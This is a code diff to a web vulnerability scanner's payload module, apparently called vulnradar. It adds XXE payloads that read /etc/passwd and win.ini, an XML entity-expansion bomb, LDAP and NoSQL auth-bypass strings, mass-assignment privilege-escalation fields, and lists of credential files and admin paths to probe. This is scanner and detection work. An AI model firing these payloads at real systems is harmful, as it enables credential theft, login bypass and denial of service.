@@ -591,12 +591,17 @@ path_traversal_detection_patterns = [
 ]
 
 path_traversal_vulnerable_params = [
+    # Explicit file/path semantics
     "file",
+    "filename",
+    "filepath",
+    "pathname",
     "path",
     "page",
     "include",
     "dir",
     "folder",
+    "directory",
     "document",
     "doc",
     "template",
@@ -609,149 +614,33 @@ path_traversal_vulnerable_params = [
     "open",
     "cat",
     "type",
-    "name",
-    "filename",
-    "filepath",
-    "pathname",
-    "location",
-    "url",
     "src",
     "source",
     "resource",
-    "content",
-    "data",
-    "info",
-    "detail",
-    "item",
-    "id",
-    "action",
-    "cmd",
-    "command",
-    "exec",
-    "run",
-    "execute",
-    "goto",
+    # Common web framework conventions
+    "url",
     "redirect",
     "forward",
     "next",
-    "prev",
-    "back",
-    "home",
-    "index",
-    "main",
-    "default",
-    "root",
-    "base",
-    "class",
-    "style",
+    "goto",
+    "location",
+    "return",
+    "returnurl",
+    "return_url",
+    # Configuration/content
+    "config",
+    "conf",
+    "content",
+    "layout",
     "skin",
     "theme",
     "lang",
     "language",
     "locale",
-    "region",
-    "country",
-    "zone",
-    "area",
-    "section",
+    # Module/component loading patterns
     "module",
-    "component",
-    "widget",
-    "block",
-    "part",
-    "piece",
-    "chunk",
-    "fragment",
-    "segment",
-    "portion",
-    "element",
-    "node",
-    "leaf",
-    "branch",
-    "tree",
-    "structure",
-    "layout",
-    "format",
-    "pattern",
-    "scheme",
-    "config",
-    "setting",
-    "option",
-    "preference",
-    "parameter",
-    "argument",
-    "value",
-    "input",
-    "output",
-    "result",
-    "response",
-    "request",
-    "query",
-    "search",
-    "find",
-    "lookup",
-    "locate",
-    "seek",
-    "fetch",
-    "retrieve",
-    "extract",
-    "parse",
-    "process",
-    "handle",
-    "manage",
-    "control",
-    "admin",
-    "user",
-    "guest",
-    "member",
-    "client",
-    "customer",
-    "visitor",
-    "session",
-    "cookie",
-    "token",
-    "key",
-    "secret",
-    "password",
-    "pass",
-    "pwd",
-    "auth",
-    "login",
-    "logout",
-    "signin",
-    "signout",
-    "register",
-    "signup",
-    "join",
-    "profile",
-    "account",
-    "dashboard",
-    "panel",
-    "console",
-    "interface",
-    "api",
-    "service",
-    "method",
-    "function",
-    "procedure",
-    "routine",
-    "task",
-    "job",
-    "work",
-    "process",
-    "thread",
-    "queue",
-    "stack",
-    "list",
-    "array",
-    "table",
-    "record",
-    "row",
-    "column",
-    "field",
-    "cell",
-    "entry",
-    "item",
+    "action",
+    "controller",
 ]
 
 # == SQL INJECTION PAYLOADS
@@ -967,4 +856,625 @@ xss_payloads = [
     "\";alert('XSS');//",
     "' onclick='alert(\"XSS\")' '",
     "javascript:alert('XSS')",
+]
+
+# == API SECURITY PATTERNS
+api_non_production_patterns = [
+    "/api/v0/",
+    "/api/dev/",
+    "/api/test/",
+    "/api/staging/",
+    "/api/internal/",
+    "/api/debug/",
+    "/api/old/",
+    "/api/deprecated/",
+    "/api/admin/",
+    "/v0/",
+    "/dev/",
+    "/test/",
+    "/staging/",
+    "/internal/",
+    "/debug/",
+    "/old/",
+    "/deprecated/",
+    "/_debug/",
+    "/_internal/",
+    "/swagger/",
+    "/swagger-ui/",
+    "/api-docs/",
+    "/graphql-playground/",
+]
+
+# == BROKEN AUTH PAYLOADS
+broken_auth_username_hints = [
+    "username",
+    "user",
+    "email",
+    "login",
+    "uid",
+    "userid",
+    "user_name",
+    "user_email",
+    "signin_email",
+]
+
+broken_auth_password_hints = [
+    "password",
+    "passwd",
+    "pwd",
+    "pass",
+    "secret",
+    "user_password",
+    "signin_password",
+]
+
+# == XXE PAYLOADS
+xxe_file_linux = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>"""
+
+xxe_file_windows = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>
+  <data>&xxe;</data>
+</root>"""
+
+xxe_oob_marker = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe_{marker} "vulnradar_xxe_probe_{marker}">
+]>
+<root>
+  <data>&xxe_{marker};</data>
+</root>"""
+
+xxe_billion_laughs = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<root>&lol9;</root>"""
+
+xxe_external_dtd = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://vulnradar-xxe-probe-{marker}.invalid/xxe.dtd">
+<root>
+  <data>test</data>
+</root>"""
+
+# == XXE EVIDENCE INDICATORS
+xxe_linux_passwd_indicators = [
+    "root:x:0:0",
+    "root:*:0:0",
+    "/bin/bash",
+    "/sbin/nologin",
+    "daemon:x:",
+]
+
+xxe_windows_ini_indicators = [
+    "[fonts]",
+    "[extensions]",
+    "[mci extensions]",
+    "win.ini",
+]
+
+xxe_billion_laughs_indicators = [
+    "entity expansion",
+    "entity reference limit",
+    "recursion limit",
+    "memory limit",
+    "parser error",
+    "xml bomb",
+    "denial of service",
+    "out of memory",
+    "stackoverflow",
+]
+
+xxe_external_dtd_indicators = [
+    "vulnradar-xxe-probe",
+    "could not resolve",
+    "failed to load external entity",
+    "dtd forbidden",
+    "external entity",
+    "connection refused",
+    "unknown host",
+]
+
+# == DESERIALIZATION PAYLOADS
+deserialization_java_magic = b"\xac\xed\x00\x05"
+
+deserialization_java_tc_null = b"\xac\xed\x00\x05\x70"
+
+deserialization_java_probe_class = (
+    b"\xac\xed\x00\x05"  # magic
+    b"\x73"  # TC_OBJECT
+    b"\x72"  # TC_CLASSDESC
+    b"\x00\x1d"  # class name length = 29
+    b"vulnradar.DeserProbe$X"  # bogus class name (29 bytes)
+    b"\x00\x00\x00\x00\x00\x00"  # padding
+    b"\x00\x00"  # serialVersionUID (8 bytes, zeroed)
+    b"\x00\x00\x00\x00\x00\x00"
+    b"\x00\x00"
+    b"\x02"  # flags: SC_SERIALIZABLE
+    b"\x00\x00"  # field count = 0
+    b"\x78"  # TC_ENDBLOCKDATA
+    b"\x70"  # TC_NULL (no superclass)
+)
+
+deserialization_python_empty_dict = b"\x80\x02}q\x00."
+
+deserialization_python_probe_module = (
+    b"\x80\x02"  # PROTO 2
+    b"c"  # GLOBAL opcode
+    b"vulnradar_probe_module\nProbe\n"  # module\nname\n
+    b")"  # EMPTY_TUPLE
+    b"\x81"  # NEWOBJ
+    b"."  # STOP
+)
+
+deserialization_python_session_cookie_names = (
+    "session",
+    "flask_session",
+    "csrftoken",
+    "sessionid",
+)
+
+# PHP deserialization variables
+deserialization_php_probe_object = b'O:14:"VulnradarProbe":1:{s:4:"test";s:5:"probe";}'
+
+deserialization_php_probe_array = b'a:1:{s:4:"test";s:5:"probe";}'
+
+deserialization_php_session_cookie_names = ("PHPSESSID", "session", "sess_id")
+
+deserialization_php_serial_prefixes = (
+    b"s:", b"i:", b"d:", b"b:", b"N;", b"a:", b"O:", b"C:"
+)
+
+# Node.js/Express deserialization variables
+deserialization_nodejs_benign_object = (
+    b'{"vulnradar_probe": "test", "value": 1}'
+)
+
+deserialization_nodejs_probe_property = (
+    b'{"vulnradar_nodejs_probe": "check", "_vulnradar_test": true}'
+)
+
+deserialization_nodejs_session_cookie_names = (
+    "connect.sid",
+    "session",
+    "sessionid",
+    "sid",
+    "express.sid",
+)
+
+# == LDAP INJECTION PAYLOADS
+ldap_injection_payloads = [
+    # Error-based: syntactically invalid LDAP filters
+    (
+        "*",
+        "error_based",
+        "Single asterisk — invalid as standalone filter, triggers syntax error",
+    ),
+    (")", "error_based", "Unmatched closing parenthesis — syntax error"),
+    ("(", "error_based", "Unmatched opening parenthesis — syntax error"),
+    (
+        ")(uid=*)",
+        "error_based",
+        "Dangling closing paren before valid filter — syntax error",
+    ),
+    ("|", "error_based", "OR operator without operands — syntax error"),
+    ("&", "error_based", "AND operator without operands — syntax error"),
+    ("!", "error_based", "NOT operator without operand — syntax error"),
+    ("\\", "error_based", "Escape character alone — syntax error"),
+    # Auth-bypass: filter rewrites that match everything or force OR logic
+    (
+        "*)(uid=*",
+        "auth_bypass",
+        "Closes original filter, then adds OR uid=* — matches all users",
+    ),
+    (
+        "admin)(|(uid=*",
+        "auth_bypass",
+        "Closes original UID check, adds OR uid=* — bypasses password check",
+    ),
+    (
+        "*)(objectClass=*",
+        "auth_bypass",
+        "Closes filter, adds OR objectClass=* — matches all directory entries",
+    ),
+    (
+        "admin)(&(uid=*",
+        "auth_bypass",
+        "Closes UID, adds AND uid=* — short-circuits password check",
+    ),
+    ("*)((|uid=*", "auth_bypass", "Closes filter with OR uid=* — auth bypass"),
+    (
+        "admin)(|(objectClass=*)",
+        "auth_bypass",
+        "OR objectClass=* — matches everything in the directory",
+    ),
+    # Wildcard enumeration: patterns for response-length oracles
+    (
+        "admin*",
+        "wildcard",
+        "Wildcard on common username — different response if admin exists",
+    ),
+    ("test*", "wildcard", "Wildcard on test account — length oracle"),
+    ("user*", "wildcard", "Wildcard on generic username — length oracle"),
+    ("a*", "wildcard", "Single-char wildcard — length oracle"),
+    (
+        "zzznomatch*",
+        "wildcard",
+        "Known-nonexistent prefix — baseline for length comparison",
+    ),
+]
+
+ldap_injection_error_indicators = [
+    # Generic LDAP error phrases
+    "ldap error",
+    "invalid dn syntax",
+    "invalid ldap",
+    "ldap search failed",
+    "bad search filter",
+    "malformed filter",
+    # Java LDAP exceptions
+    "javax.naming.namenotfoundexception",
+    "javax.naming.invalidnameexception",
+    "javax.naming.namingexception",
+    "com.sun.jndi.ldap",
+    # Python LDAP exceptions
+    "ldap.invalid_dn_syntax",
+    "ldap.filter_error",
+    "ldap3.core.exceptions",
+    # PHP LDAP errors
+    "ldap_search()",
+    "ldap_bind()",
+    "warning: ldap",
+    # OpenLDAP / Active Directory error codes
+    "error code 34",  # invalid DN syntax
+    "error code 87",  # bad search filter
+    "error code 12",  # unavailable critical extension (can indicate filter issues)
+]
+
+# == MASS ASSIGNMENT PAYLOADS
+mass_assignment_probe_fields = [
+    # Privilege flags
+    (
+        "is_admin",
+        True,
+        "High",
+        "Direct admin-flag injection — full privilege escalation",
+    ),
+    ("admin", True, "High", "Boolean admin flag (alternate naming convention)"),
+    ("is_staff", True, "High", "Staff-level privilege flag (Django convention)"),
+    ("is_superuser", True, "High", "Superuser flag — highest privilege tier"),
+    (
+        "role",
+        "admin",
+        "High",
+        "Role field set to 'admin' — privilege escalation via role override",
+    ),
+    ("user_role", "admin", "High", "User-role field (alternate naming convention)"),
+    # Account state
+    ("is_active", True, "Medium", "Reactivation of a disabled/banned account"),
+    (
+        "status",
+        "active",
+        "Medium",
+        "Account-status override — may reactivate banned accounts",
+    ),
+    ("verified", True, "Medium", "Email/account verification bypass"),
+    ("email_verified", True, "Medium", "Email-verification flag bypass"),
+    ("is_verified", True, "Medium", "Verification flag (alternate naming convention)"),
+    # Credentials and secrets
+    (
+        "password",
+        "pwned123",
+        "Critical",
+        "Direct password override — instant account takeover",
+    ),
+    ("token", "injected", "High", "Auth-token injection — session hijack"),
+    ("secret", "injected", "High", "Secret-key injection"),
+    ("api_key", "injected", "High", "API-key override"),
+    # Identity / ownership
+    ("id", 999999, "High", "Object-ID override — may allow acting as another object"),
+    (
+        "owner_id",
+        999999,
+        "High",
+        "Ownership reassignment — transfers object to attacker-controlled ID",
+    ),
+    (
+        "user_id",
+        999999,
+        "High",
+        "User-ID override on a non-user object — ownership takeover",
+    ),
+    ("tenant_id", 999999, "High", "Tenant-ID override — cross-tenant data access"),
+    # Timestamps (audit-trail tampering)
+    (
+        "created_at",
+        "2000-01-01T00:00:00Z",
+        "Medium",
+        "Creation-timestamp manipulation — hides object origin",
+    ),
+    (
+        "updated_at",
+        "2000-01-01T00:00:00Z",
+        "Medium",
+        "Update-timestamp manipulation — hides recent changes",
+    ),
+    # Financial
+    ("balance", 999999, "Critical", "Balance manipulation — direct financial fraud"),
+    ("credits", 999999, "Critical", "Credit manipulation — direct financial fraud"),
+    ("amount", 999999, "High", "Amount field override on a transaction or order"),
+    # Permissions
+    ("permissions", ["*"], "High", "Wildcard permission injection"),
+    ("groups", ["admin"], "High", "Admin-group injection via group membership"),
+    (
+        "scopes",
+        ["*"],
+        "High",
+        "OAuth-scope widening — privilege escalation on API tokens",
+    ),
+]
+
+# == NOSQL INJECTION PAYLOADS
+nosql_injection_payloads = [
+    # Error-based: invalid operators that trigger database errors
+    (
+        '{"$vulnradar": 1}',
+        "error_based",
+        "Bogus operator — triggers 'unknown operator' error",
+    ),
+    (
+        '{"$where": "invalid js"}',
+        "error_based",
+        "$where with invalid JavaScript — triggers syntax error",
+    ),
+    (
+        '{"$regex": "[invalid"}',
+        "error_based",
+        "$regex with invalid regex — triggers regex error",
+    ),
+    # Auth-bypass: operators that match everything
+    (
+        '{"$ne": null}',
+        "auth_bypass",
+        "$ne null — matches all non-null values (all users)",
+    ),
+    ('{"$ne": ""}', "auth_bypass", "$ne empty string — matches all non-empty values"),
+    (
+        '{"$gt": ""}',
+        "auth_bypass",
+        "$gt empty string — matches all values (always true)",
+    ),
+    ('{"$gte": ""}', "auth_bypass", "$gte empty string — matches all values"),
+    (
+        '{"$exists": true}',
+        "auth_bypass",
+        "$exists true — matches all documents with this field",
+    ),
+    (
+        '{"$nin": []}',
+        "auth_bypass",
+        "$nin empty array — matches all values (not in empty set)",
+    ),
+    ('{"$regex": ".*"}', "auth_bypass", "$regex .* — matches all strings"),
+    # Comparison: operators for response-length oracles
+    ('{"$gt": ""}', "comparison", "$gt empty string — always true"),
+    ('{"$lt": ""}', "comparison", "$lt empty string — always false"),
+    ('{"$gt": "zzzzzzzzz"}', "comparison", "$gt long string — usually false"),
+    (
+        '{"$eq": "vulnradar_test"}',
+        "comparison",
+        "$eq specific value — true if it matches",
+    ),
+]
+
+nosql_injection_url_operator_payloads = [
+    ("[$ne]", "null", "URL-encoded $ne operator"),
+    ("[$gt]", "", "URL-encoded $gt operator"),
+    ("[$regex]", ".*", "URL-encoded $regex operator"),
+    ("[$exists]", "true", "URL-encoded $exists operator"),
+]
+
+nosql_injection_error_indicators = [
+    # MongoDB errors
+    "mongoerror",
+    "unknown operator",
+    "invalid operator",
+    "mongo exception",
+    "bson",
+    "mongodb",
+    "pymongo",
+    "mongoose",
+    "mongod",
+    # CouchDB errors
+    "couchdb",
+    "bad_request",
+    "invalid_json",
+    # Generic NoSQL errors
+    "nosql",
+    "syntax error in query",
+    "query parse error",
+    "invalid query",
+    # JavaScript errors from $where clauses
+    "referenceerror",
+    "syntaxerror",
+    "typeerror",
+    "javascript",
+]
+
+# == SECURITY MISCONFIGURATION PATTERNS
+security_misconfig_credential_files = [
+    (
+        ".env",
+        "Critical",
+        "Environment variables — typically holds DB passwords, API keys, and secrets",
+    ),
+    (".env.production", "Critical", "Production environment variables"),
+    (".env.local", "Critical", "Local environment variables"),
+    (".env.development", "Critical", "Development environment variables"),
+    ("config.json", "High", "Application configuration (JSON)"),
+    ("config.yml", "High", "Application configuration (YAML)"),
+    ("config.yaml", "High", "Application configuration (YAML)"),
+    (
+        "application.properties",
+        "High",
+        "Java application properties — often contains DB URLs and credentials",
+    ),
+    ("application.yml", "High", "Java Spring Boot configuration"),
+    ("settings.py", "High", "Python settings/configuration module"),
+    (
+        "wp-config.php",
+        "Critical",
+        "WordPress config — contains DB host, name, user, password",
+    ),
+    ("database.yml", "Critical", "Rails-style database configuration"),
+    (
+        ".htpasswd",
+        "Critical",
+        "Apache HTTP password file — contains hashed credentials",
+    ),
+    ("credentials.json", "Critical", "Explicit credential storage"),
+    (".npmrc", "High", "NPM config — may contain registry auth tokens"),
+    (".pypirc", "High", "PyPI config — may contain upload auth tokens"),
+    (
+        "docker-compose.yml",
+        "High",
+        "Docker Compose — may expose service topology and secrets",
+    ),
+    (
+        "Dockerfile",
+        "Medium",
+        "Dockerfile — reveals build steps, base images, installed packages",
+    ),
+]
+
+security_misconfig_git_exposure = [
+    (
+        ".git/HEAD",
+        "High",
+        "Git HEAD ref — confirms .git directory is publicly browsable",
+    ),
+    (
+        ".git/config",
+        "High",
+        "Git config — may contain remote URLs with embedded tokens",
+    ),
+    (
+        ".git/refs/heads/master",
+        "Medium",
+        "Git master branch ref — confirms full repository is browsable",
+    ),
+]
+
+security_misconfig_backup_files = [
+    ("index.php.bak", "Medium", "Backup of index.php — may contain full source code"),
+    ("index.php~", "Medium", "Editor swap file for index.php"),
+    ("index.php.old", "Medium", "Old copy of index.php"),
+    ("index.bak", "Medium", "Generic backup file"),
+    ("index.orig", "Medium", "Original file before patch"),
+    ("app.js.bak", "Medium", "Backup of application JavaScript"),
+    (
+        ".DS_Store",
+        "Low",
+        "macOS directory metadata — reveals exact file and folder names",
+    ),
+    ("Thumbs.db", "Low", "Windows thumbnail cache — reveals directory contents"),
+]
+
+security_misconfig_test_files = [
+    ("test.php", "Medium", "Test PHP file left in production"),
+    ("test.html", "Low", "Test HTML page left in production"),
+    (
+        "phpinfo.php",
+        "High",
+        "PHP info — full runtime configuration, loaded modules, env vars",
+    ),
+    ("info.php", "High", "PHP info (common alternate filename)"),
+    (
+        "server-status",
+        "Medium",
+        "Apache server-status — active connections, request log",
+    ),
+    ("server-info", "Medium", "Apache server-info — loaded modules, configuration"),
+    ("console", "Medium", "Debug console (Symfony, Rails, etc.)"),
+    ("actuator", "Medium", "Spring Boot Actuator root — enumerates all sub-endpoints"),
+    ("actuator/env", "High", "Spring Boot Actuator env — all environment variables"),
+    ("actuator/mappings", "High", "Spring Boot Actuator mappings — full route table"),
+    ("actuator/health", "Low", "Spring Boot Actuator health — internal status"),
+    ("debug", "Medium", "Generic debug endpoint"),
+    ("trace", "Medium", "Request-trace endpoint — recent request/response log"),
+]
+
+security_misconfig_admin_panels = [
+    ("admin", "High", "Default admin path"),
+    ("admin/", "High", "Default admin path (trailing slash)"),
+    ("administrator", "High", "Default administrator path"),
+    ("wp-admin/", "High", "WordPress admin panel"),
+    ("phpmyadmin", "High", "phpMyAdmin — direct database management"),
+    ("phpmyadmin/", "High", "phpMyAdmin (trailing slash)"),
+    ("adminer", "High", "Adminer — direct database management"),
+    ("adminer.php", "High", "Adminer single-file installer"),
+    ("panel", "Medium", "Generic management panel"),
+    ("dashboard", "Medium", "Generic dashboard"),
+    ("manage", "Medium", "Generic management path"),
+]
+
+security_misconfig_api_docs = [
+    ("swagger.json", "Medium", "Swagger/OpenAPI spec — full API blueprint in JSON"),
+    ("swagger.yaml", "Medium", "Swagger/OpenAPI spec — full API blueprint in YAML"),
+    ("api-docs", "Medium", "API documentation index"),
+    ("api/docs", "Medium", "API documentation (nested path)"),
+    ("docs/api", "Medium", "API documentation (alternate nesting)"),
+    ("openapi.json", "Medium", "OpenAPI 3.x specification (JSON)"),
+    ("openapi.yaml", "Medium", "OpenAPI 3.x specification (YAML)"),
+    ("redoc", "Medium", "ReDoc-rendered API documentation"),
+    ("graphql", "Medium", "GraphQL endpoint — introspection may be enabled"),
+    ("graphiql", "Medium", "GraphiQL IDE — interactive query builder"),
+]
+
+security_misconfig_dir_listing_indicators = [
+    "index of /",  # Apache default title
+    "directory listing",  # generic phrase
+    "<th>last modified</th>",  # Apache / Nginx sortable column
+    "parent directory",  # Apache "Parent Directory" link label
+    "[to parent directory]",  # alternate Apache wording
+]
+
+security_misconfig_verbose_error_indicators = [
+    # Python
+    ("traceback (most recent call last)", "Python stack trace"),
+    ("django.core.exceptions", "Django internal exception class"),
+    ("flask.exceptions", "Flask internal exception class"),
+    # Java
+    ("java.lang.", "Java exception class"),
+    ("at org.", "Java stack-trace frame"),
+    ("caused by:", "Java chained-exception marker"),
+    # PHP
+    ("php fatal error", "PHP fatal error"),
+    ("php warning", "PHP warning"),
+    ("php notice", "PHP notice"),
+    # .NET
+    ("system.exception", ".NET System.Exception"),
+    ("unhandled exception", ".NET unhandled exception"),
+    # Generic
+    ("stack trace:", "Generic stack trace"),
 ]
